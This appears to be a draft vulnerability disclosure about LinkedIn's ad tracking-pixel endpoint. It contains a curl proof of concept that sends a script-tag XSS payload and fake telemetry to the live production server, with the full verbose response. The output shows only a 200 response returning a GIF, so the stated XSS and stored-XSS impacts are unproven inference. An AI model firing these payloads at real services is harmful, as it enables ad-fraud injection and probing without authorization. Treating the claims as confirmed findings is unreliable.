LinkedIn Report - Quick Draft

Title: Unauthenticated Telemetry Injection in LinkedIn Insight Tracking Pixel

Endpoint: https://px.ads.linkedin.com/collect

Vulnerability Details:

    No authentication required

    Accepts arbitrary url and ref parameters

    XSS payloads accepted

    No rate limiting (10/10 bulk requests accepted)

    Returns 200 OK with linkedin-action: 1 header

Proof of Concept:
bash

curl -v "https://px.ads.linkedin.com/collect?url=<script>alert('LinkedIn-XSS')</script>&ref=TEST"

Impact:

    Inject fake conversion events

    Corrupt LinkedIn Ads attribution

    Potential stored XSS in Campaign Manager dashboards

Report To: security@linkedin.com

test output:

ek0ms@ek0ms:~/telemetry-research/linkedin$ curl -v "https://px.ads.linkedin.com/collect?url=<script>alert('LinkedIn-XSS')</script>&ref=TEST"
* Host px.ads.linkedin.com:443 was resolved.
* IPv6: 2a06:98c1:3109::6812:2929, 2a06:98c1:310b::ac40:92d7
* IPv4: 172.64.146.215, 104.18.41.41
*   Trying [2a06:98c1:3109::6812:2929]:443...
* Connected to px.ads.linkedin.com (2a06:98c1:3109::6812:2929) port 443
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: /etc/ssl/certs
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / X25519 / RSASSA-PSS
* ALPN: server accepted h2
* Server certificate:
*  subject: C=US; ST=California; L=Sunnyvale; O=LinkedIn Corporation; CN=www.linkedin.com
*  start date: Mar 19 00:00:00 2026 GMT
*  expire date: Sep 19 23:59:59 2026 GMT
*  subjectAltName: host "px.ads.linkedin.com" matched cert's "px.ads.linkedin.com"
*  issuer: C=US; O=DigiCert Inc; CN=DigiCert Global G2 TLS RSA SHA256 2020 CA1
*  SSL certificate verify ok.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
*   Certificate level 1: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
*   Certificate level 2: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* using HTTP/2
* [HTTP/2] [1] OPENED stream for https://px.ads.linkedin.com/collect?url=<script>alert('LinkedIn-XSS')</script>&ref=TEST
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: https]
* [HTTP/2] [1] [:authority: px.ads.linkedin.com]
* [HTTP/2] [1] [:path: /collect?url=<script>alert('LinkedIn-XSS')</script>&ref=TEST]
* [HTTP/2] [1] [user-agent: curl/8.5.0]
* [HTTP/2] [1] [accept: */*]
> GET /collect?url=<script>alert('LinkedIn-XSS')</script>&ref=TEST HTTP/2
> Host: px.ads.linkedin.com
> User-Agent: curl/8.5.0
> Accept: */*
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
< HTTP/2 200 
< date: Mon, 13 Jul 2026 03:04:00 GMT
< content-type: image/gif
< vary: Accept-Encoding
< server: cloudflare
< linkedin-action: 1
< strict-transport-security: max-age=31536000
< set-cookie: bcookie="v=2&1e747ccf-e09e-40b0-8264-9b53a601d87b"; domain=.linkedin.com; Path=/; Secure; Expires=Tue, 13-Jul-2027 03:04:00 GMT; SameSite=None
< set-cookie: lidc="b=OGST02:s=O:r=O:a=O:p=O:g=3822:u=1:x=1:i=1783911840:t=1783998240:v=2:sig=AQHWpdpOv8zrMZ233XM0Ve-mPo-nvlbn"; Expires=Tue, 14 Jul 2026 03:04:00 GMT; domain=.linkedin.com; Path=/; SameSite=None; Secure
< set-cookie: __cf_bm=xIGmLcQT7aqpse1uBkkGEL__Zd5HVbaxZ8ctkvTmjww-1783911840.1149607-1.0.1.1-rtgMsnjq3e9rnz1tky5LwuabxceQWywcFpkynPCDI893Z6Jro461FbsDyyJCaMyetldJBe9j52daLEg3pJR1tuDJsT8HYjTVC_PWf4QOEiSFih0M3BM_SIpp_emF9qck; HttpOnly; SameSite=None; Secure; Path=/; Domain=linkedin.com; Expires=Mon, 13 Jul 2026 03:34:00 GMT
< x-li-fabric: prod-lor1
< x-li-pop: cf-prod-lor1-x
< x-li-proto: http/2
< x-li-uuid: AAZWdVeKinjuhH4BWPBxpw==
< x-content-type-options: nosniff
< cf-cache-status: DYNAMIC
< cf-ray: a1a50ec8bd459617-SEA
< alt-svc: h3=":443"; ma=86400
< 
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
* Failure writing output to destination
* Connection #0 to host px.ads.linkedin.com left intact
ek0ms@ek0ms:~/telemetry-research/linkedin$ nano linkedin_report.md

